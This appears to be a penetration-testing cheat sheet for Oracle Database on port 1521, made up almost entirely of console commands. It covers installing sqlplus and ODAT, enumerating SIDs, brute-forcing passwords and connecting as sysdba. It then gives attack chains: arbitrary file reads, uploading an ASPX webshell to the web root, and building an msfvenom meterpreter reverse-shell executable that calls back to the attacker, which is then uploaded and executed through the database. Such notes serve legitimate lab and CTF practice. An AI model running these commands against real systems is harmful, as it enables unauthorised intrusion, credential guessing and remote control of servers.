---
title: "Oracle Database"
date: 2024-7-5
tags: ["oracle", "database", "1521", "sqlplus", "odat", "revshell", "rce"]
---

### Tools

{{< tab set1 tab1 active >}}sqlplus{{< /tab >}}
{{< tab set1 tab2 >}}ODAT{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```console
# Install
sudo apt install oracle-instantclient-sqlplus
```

```console
# export LD_LIBRARY_PATH
export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}
```

```console
# Check
sqlplus -V
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```console
# Install
sudo apt install odat
```

```console
# Check
odat --version
```

</div>

<small>*Ref: [Download ODAT](https://github.com/quentinhardy/odat)*</small>

{{< /tabcontent >}}

<br>

---

### Enum

<div>

```console
# SID enum (You only need one)
odat sidguesser -s <TARGET>
```

```console
# User/Password brute force
odat passwordguesser -s <TARGET> -d <SID> --accounts-file accounts.txt
```

```console
# Run all checks with creds as sysdba
odat all -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba
```

</div>

### General

<div>

```console
# Export everytime or add to ~/.zshrc
export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}
```

```console
# Connect
sqlplus '<USER>/<PASSWORD>@<TARGET>:1521/<SID>'
```

```console
# Connect as sysdba (sudo)
sqlplus '<USER>/<PASSWORD>@<TARGET>:1521/<SID>' as sysdba
```

```console
# Check privilege
select * from user_role_privs;
```

</div>

<br>

---
#### Arbitrary Read

<div>

```console
odat ctxsys -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba --getFile c:\\users\\administrator\\desktop\\file.txt
```

</div>

#### Upload File to RCE

<div>

```console
odat dbmsadvisor -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba --putFile C:\\inetpub\\wwwroot cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx
```

</div>

#### Execute binary to RCE

<div>

```console
# Create a malicious exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f exe -o revshell.exe
```

```console
# Upload
odat utlfile -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba --putFile \\Temp revshell.exe revshell.exe
```

```console
# Execute
odat externaltable -s <TARGET> -U <USER> -P '<PASSWORD>' -d <SID> --sysdba --exec \\Temp revshell.exe
```

</div>

<br>